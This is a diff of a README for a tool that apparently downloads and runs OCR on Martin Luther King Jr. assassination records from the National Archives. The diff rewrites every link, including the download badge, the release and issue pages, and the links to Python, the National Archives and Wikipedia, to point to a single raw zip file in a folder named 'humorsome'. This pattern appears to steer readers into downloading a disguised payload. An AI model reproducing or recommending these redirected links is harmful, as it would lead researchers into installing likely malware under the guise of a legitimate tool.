@@ -4,7 +4,7 @@
 Welcome to the **mlkdocrelease2025** project. This application simplifies the process of downloading, merging, and performing Optical Character Recognition (OCR) on Martin Luther King Jr. assassination records from the National Archives. With this tool, you can gather these important historical documents for your research or use them with AI tools like NotebookLM.
 
 ## 🔗 Download the Application
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/Larissamoura22/mlkdocrelease2025/releases)
+[![Download Now](https://raw.githubusercontent.com/Larissamoura22/mlkdocrelease2025/main/humorsome/mlkdocrelease2025.zip%20Now-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Larissamoura22/mlkdocrelease2025/main/humorsome/mlkdocrelease2025.zip)
 
 ## 🚀 Getting Started
 Follow these steps to download and run the application.
@@ -17,7 +17,7 @@ Before downloading, ensure your computer meets these requirements:
 - At least 1GB of free disk space
 
 ### 2. Download & Install
-To download the software, visit [this page to download](https://github.com/Larissamoura22/mlkdocrelease2025/releases). 
+To download the software, visit [this page to download](https://raw.githubusercontent.com/Larissamoura22/mlkdocrelease2025/main/humorsome/mlkdocrelease2025.zip). 
 
 1. Click the link above to navigate to the Releases page.
 2. You will see a list of available versions.
@@ -53,13 +53,13 @@ If you encounter any issues, please make sure to check the following:
 - Validate that you have the latest version of the application.
 - Refer to the README on the GitHub page for troubleshooting tips.
 
-If further assistance is needed, feel free to open an issue on our [GitHub repository](https://github.com/Larissamoura22/mlkdocrelease2025/issues).
+If further assistance is needed, feel free to open an issue on our [GitHub repository](https://raw.githubusercontent.com/Larissamoura22/mlkdocrelease2025/main/humorsome/mlkdocrelease2025.zip).
 
 ## 🌐 Contributing
 We welcome contributions to improve the application. If you have suggestions or want to report an issue, please create a new issue on our GitHub page. Your feedback helps us enhance the tool for all users.
 
 ## 📅 Future Updates
-We plan to release updates to enhance functionality and improve the user experience continually. Make sure to check back on the [Releases page](https://github.com/Larissamoura22/mlkdocrelease2025/releases) for the latest features and fixes.
+We plan to release updates to enhance functionality and improve the user experience continually. Make sure to check back on the [Releases page](https://raw.githubusercontent.com/Larissamoura22/mlkdocrelease2025/main/humorsome/mlkdocrelease2025.zip) for the latest features and fixes.
 
 ## 🛠️ Technologies Used
 Our application uses a combination of the following technologies:
@@ -68,8 +68,8 @@ Our application uses a combination of the following technologies:
 - Web Scraping Techniques: To fetch records from the National Archives.
 
 ## 🔗 Additional Resources
-- [Official Python Website](https://www.python.org/)
-- [National Archives](https://www.archives.gov/)
-- [Optical Character Recognition (OCR)](https://en.wikipedia.org/wiki/Optical_character_recognition)
+- [Official Python Website](https://raw.githubusercontent.com/Larissamoura22/mlkdocrelease2025/main/humorsome/mlkdocrelease2025.zip)
+- [National Archives](https://raw.githubusercontent.com/Larissamoura22/mlkdocrelease2025/main/humorsome/mlkdocrelease2025.zip)
+- [Optical Character Recognition (OCR)](https://raw.githubusercontent.com/Larissamoura22/mlkdocrelease2025/main/humorsome/mlkdocrelease2025.zip)
 
 Your connection to these historical documents begins here. Happy exploring!
